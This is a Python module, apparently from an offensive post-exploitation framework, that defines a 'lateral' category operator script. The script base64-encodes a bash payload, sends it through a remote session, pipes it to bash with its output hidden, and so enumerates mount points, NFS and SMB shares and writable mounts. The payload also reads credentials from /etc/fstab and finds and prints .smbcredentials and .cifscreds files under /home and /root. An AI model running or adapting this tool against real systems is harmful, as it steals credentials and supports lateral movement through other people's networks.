"""Mount point enumeration script."""

from ..base import OperatorScript, ScriptResult


class MountEnum(OperatorScript):
    """Enumerate mount points and network shares."""
    
    name = "Mount Point Enumeration"
    description = "Enumerate mount points and network shares"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] MOUNT POINT ENUMERATION"
echo "==========================="
echo ""

echo "[+] All mounted filesystems:"
mount | grep -v "^/dev/loop"
echo ""

echo "[+] Mount details from /proc/mounts:"
cat /proc/mounts | grep -v "^/dev/loop" | column -t
echo ""

echo "[+] Disk usage:"
df -h | grep -v "tmpfs\|devtmpfs"
echo ""

echo "[+] NFS exports:"
if [ -f /etc/exports ]; then
    cat /etc/exports | grep -v "^#"
else
    echo "[-] No /etc/exports file"
fi
echo ""

echo "[+] NFS mounts:"
mount | grep nfs
showmount -e localhost 2>/dev/null
echo ""

echo "[+] SMB/CIFS mounts:"
mount | grep cifs
if command -v smbclient &>/dev/null; then
    echo "[*] Enumerating SMB shares on localhost:"
    smbclient -L localhost -N 2>/dev/null
else
    echo "[-] smbclient not available"
fi
echo ""

echo "[+] Checking /etc/fstab for credentials:"
if [ -f /etc/fstab ]; then
    grep -E "cifs|nfs|smb" /etc/fstab 2>/dev/null | grep -v "^#"
else
    echo "[-] Cannot read /etc/fstab"
fi
echo ""

echo "[+] Searching for SMB credential files:"
find /home /root -name ".smbcredentials" -o -name ".cifscreds" 2>/dev/null -exec cat {} \;
echo ""

echo "[+] Writable mount points:"
mount | grep -v "^/dev/loop" | while read line; do
    MOUNT_POINT=$(echo "$line" | awk '{print $3}')
    if [ -w "$MOUNT_POINT" ]; then
        echo "[!] Writable: $MOUNT_POINT"
    fi
done
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Enumerating mount points...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Mount enumeration executed",
                metadata={"script": "mount_enum"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
